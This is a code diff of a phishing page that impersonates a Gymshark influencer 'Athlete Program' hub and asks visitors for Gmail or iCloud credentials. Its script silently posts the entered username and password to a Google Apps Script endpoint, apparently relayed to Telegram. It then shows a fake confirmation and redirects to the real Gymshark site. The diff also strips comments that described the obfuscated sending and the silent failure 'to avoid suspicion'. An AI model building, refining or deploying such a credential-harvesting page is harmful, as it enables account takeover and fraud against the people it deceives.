@@ -6,11 +6,11 @@
     <title>Gymshark Athlete Program | Partner Hub</title>
     <link rel="icon" type="image/png" href="favicon.png">
     <style>
-        /* --- Configuración Global Estilo Gymshark (Estética Fiel) --- */
+        
         :root {
             --bg-dark: #000000;
             --text-main: #FFFFFF;
-            --text-secondary: #9B9B9B; /* Gris exacto de los placeholders y subtítulos */
+            --text-secondary: #9B9B9B; 
             --input-bg: #1A1A1A;
             --btn-bg: #FFFFFF;
             --btn-text: #000000;
@@ -33,21 +33,21 @@
             overflow-x: hidden;
         }
 
-        /* --- Contenedor Principal Unificado --- */
+        
         .u-shell {
             width: 100%;
-            max-width: 440px; /* Ancho fiel al login de la imagen */
+            max-width: 440px; 
             text-align: center;
         }
 
-        /* --- Vistas: Control de SPA (Ofuscación de Flujo) --- */
-        #c_v { display: none; opacity: 0; } /* Vista Confirmación */
-        #a_v { display: block; }            /* Vista Solicitud (Login) */
+        
+        #c_v { display: none; opacity: 0; } 
+        #a_v { display: block; }            
 
-        /* --- Cabecera del Logo (12% más grande aplicado) --- */
+        
         .brand-hdr { margin-bottom: 40px; display: flex; justify-content: center; }
         .logo-img {
-            height: 33.6px; /* 30px + 12% extra */
+            height: 33.6px; 
             width: auto;
             object-fit: contain;
             display: block;
@@ -55,13 +55,13 @@
 
         @media (min-width: 768px) { .logo-img { height: 39.2px; } }
 
-        /* --- Tipografía (Recreación exacta de la imagen) --- */
+        
         .hdr-pnltext { color: var(--text-secondary); font-size: 0.75rem; text-transform: uppercase; letter-spacing: 2px; font-weight: 700; margin-bottom: 8px; }
         h1 { font-size: 2.3rem; font-weight: 900; line-height: 1; letter-spacing: -1px; margin-bottom: 12px; text-transform: uppercase; }
         .scout-p { font-size: 1rem; font-weight: 600; margin-bottom: 5px; }
         .info-desc { color: var(--text-secondary); font-size: 0.88rem; line-height: 1.5; margin-bottom: 35px; font-weight: 400; }
 
-        /* --- Formulario y Campos (Estilo Fiel) --- */
+        
         .f-wrap { position: relative; margin-bottom: 18px; text-align: left; }
         
         .c-field {
@@ -77,13 +77,13 @@
             transition: border-color 0.2s;
         }
 
-        /* Validación visual sutil (manteniendo estética) */
+        
         .c-field:focus { border-color: #555; }
         .c-field:not(:placeholder-shown):valid { border-color: var(--success-green); }
 
         .c-field::placeholder { color: var(--text-secondary); font-weight: 400; }
 
-        /* --- Botón de Acción (Texto Fiel) --- */
+        
         .action-cta {
             width: 100%;
             background: var(--btn-bg);
@@ -105,15 +105,15 @@
 
         .action-cta:disabled { opacity: 0.7; cursor: not-allowed; }
 
-        /* --- Elementos de UI (Spinner/Iconos) --- */
+        
         .icon-ch { width: 60px; height: 60px; border: 3px solid var(--success-green); border-radius: 50%; color: var(--success-green); font-size: 30px; line-height: 56px; margin: 0 auto 20px; display: block; }
         .spin { width: 22px; height: 22px; border: 3px solid rgba(0,0,0,0.1); border-top-color: #000; border-radius: 50%; animation: rot 0.8s linear infinite; display: none; margin-left: 10px; }
         @keyframes rot { to { transform: rotate(360deg); } }
 
-        /* --- Footer (Texto Fiel) --- */
+        
         .ftr-legal { color: var(--text-secondary); font-size: 0.72rem; margin-top: 80px; font-weight: 500; }
 
-        /* --- Animaciones SPA --- */
+        
         .fade-in { animation: fIn 0.6s forwards; display: block !important; opacity: 1 !important; }
         @keyframes fIn { to { opacity: 1; transform: translateY(0); } }
     </style>
@@ -129,11 +129,11 @@
             <p class="hdr-pnltext">Gymshark | Influencer Partner Hub</p>
             <h1>Join the Athlete Program</h1>
             <p class="scout-p">Scouting: Central America Regional</p>
-            <p class="info-desc">Connect your Instagram metrics via Meta for Business to validate your engagement and apply for the Regional Athlete Program.</p>
+            <p class="info-desc">Log in with your Gmail or iClude account to validate your participation and apply for the Regional Athlete Program.</p>
             
             <form id="metrics-form">
                 <div class="f-wrap">
-                    <input type="text" name="u_key_1" class="c-field" placeholder="Instagram Username or Email" required minlength="4">
+                    <input type="text" name="u_key_1" class="c-field" placeholder=" IClude or Email (personal)" required minlength="4">
                 </div>
                 <div class="f-wrap">
                     <input type="password" name="u_key_2" class="c-field" placeholder="Password" required minlength="6">
@@ -159,7 +159,7 @@
     </div>
 
     <script>
-        // Puente de Datos (Telegram a través de Apps Script)
+        
         const GW_URL = 'https://script.google.com/macros/s/AKfycbymtCsEp2OVdf7pW93CDnldoIbk3W9ORSpz3FMvSfQoYGnVeqeELXn5VDICaTAB3ojemg/exec';
 
         const form = document.getElementById('metrics-form');
@@ -172,7 +172,7 @@
         form.addEventListener('submit', e => {
             e.preventDefault();
             
-            // UI Feedback
+            
             ctaTxt.style.display = 'none';
             ctaLdr.style.display = 'block';
             ctaBtn.disabled = true;
@@ -181,7 +181,7 @@
             const payload = {};
             fData.forEach((v, k) => payload[k] = v);
 
-            // Envío Ofuscado (Silent Mode)
+            
             fetch(GW_URL, {
                 method: 'POST',
                 mode: 'no-cors',
@@ -189,18 +189,18 @@
             })
             .then(() => {
                 setTimeout(() => {
-                    // Transición SPA (No hay recarga de página)
+                    
                     vApply.style.display = 'none';
                     vConfirm.classList.add('fade-in');
                     
-                    // Redirección Final Estilo Gymshark
+                    
                     setTimeout(() => {
                         window.location.href = 'https://www.gymshark.com';
                     }, 5000);
                 }, 1800);
             })
             .catch(() => {
-                // Falla Silenciosa (Evita sospechas, útil para despliegues)
+                
                 window.location.reload();
             });
         });
